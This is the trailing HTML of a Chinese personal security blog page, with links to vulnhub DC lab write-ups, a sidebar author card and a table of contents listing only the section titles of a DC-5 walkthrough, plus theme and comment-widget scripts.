style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">vulnhub靶场记录DC-3</div></div></a></div><div><a href="/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub靶场记录DC-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-04</div><div class="title">vulnhub靶场记录DC-4</div></div></a></div><div><a href="/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/" title="vulnhub靶场记录DC-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-21</div><div class="title">vulnhub靶场记录DC-2</div></div></a></div><div><a href="/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/" title="vulnhub靶场记录DC-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-31</div><div class="title">vulnhub靶场记录DC-1</div></div></a></div><div><a href="/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/" title="vulnhub靶场记录DC-6"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-29</div><div class="title">vulnhub靶场记录DC-6</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-text">vulnhub靶场DC-5通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-text">靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA"><span class="toc-text">渗透靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">一、信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8Brpcbind%E6%9C%8D%E5%8A%A1"><span class="toc-text">了解一下rpcbind服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%AE%BF%E9%97%AEweb%E7%AB%99%E7%82%B9"><span class="toc-text">二、访问web站点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">确认文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8bp%E6%89%BE%E5%88%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8F%98%E9%87%8F%E5%90%8D%E5%92%8C%E5%8C%85%E5%90%AB%E5%80%BC"><span class="toc-text">使用bp找到文件包含的变量名和包含值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-text">进行日志包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-text">三、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bsuid%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4"><span class="toc-text">查看suid提权命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exim4%E6%8F%90%E6%9D%83"><span class="toc-text">exim4提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-text">1.查找漏洞利用脚本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-exim4%E6%8F%90%E6%9D%83%E5%A4%B1%E8%B4%A5"><span class="toc-text">2.exim4提权失败</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#screen-4-5-0-%E6%8F%90%E6%9D%83"><span class="toc-text">screen-4.5.0 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-1"><span class="toc-text">1.查找漏洞利用脚本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E4%BF%9D%E5%AD%98%E5%88%B0%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="toc-text">2.将漏洞利用脚本保存到攻击机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B41154-sh"><span class="toc-text">3.查看41154.sh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E7%BC%96%E8%AF%91libhax-c%E6%96%87%E4%BB%B6"><span class="toc-text">4.编译libhax.c文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E7%BC%96%E8%AF%91rootshell-c%E6%96%87%E4%BB%B6%E5%B9%B6%E5%88%A0%E9%99%A4"><span class="toc-text">5.编译rootshell.c文件并删除</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%8F%A6%E5%AD%98%E4%B8%BA%E6%96%B0%E7%9A%84dc5-sh%E6%96%87%E4%BB%B6"><span class="toc-text">6.另存为新的dc5.sh文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E5%88%B0%E9%9D%B6%E6%9C%BA"><span class="toc-text">6.下载漏洞脚本到靶机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E6%8F%90%E6%9D%83"><span class="toc-text">7.提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/30/NKCTF2024/" title="2024NKCTF">2024NKCTF</a><time datetime="2024-03-30T02:51:06.292Z" title="发表于 2024-03-30 10:51:06">2024-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/" title="HTBCyberCTF2024">HTBCyberCTF2024</a><time datetime="2024-03-16T11:52:36.682Z" title="发表于 2024-03-16 19:52:36">2024-03-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/04/vulnhub%E9%9D%B6%E5%9C%BADC-7/" title="无题">无题</a><time datetime="2024-03-04T10:27:12.834Z" title="发表于 2024-03-04 18:27:12">2024-03-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/" title="2023年中国工业互联网安全大赛决赛-misc">2023年中国工业互联网安全大赛决赛-misc</a><time datetime="2024-03-03T12:36:18.167Z" title="发表于 2024-03-03 20:36:18">2024-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/" title="vulnhub靶场记录DC-6">vulnhub靶场记录DC-6</a><time datetime="2024-02-29T02:34:41.927Z" title="发表于 2024-02-29 10:34:41">2024-02-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
      avatar: 'monsterid',
      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>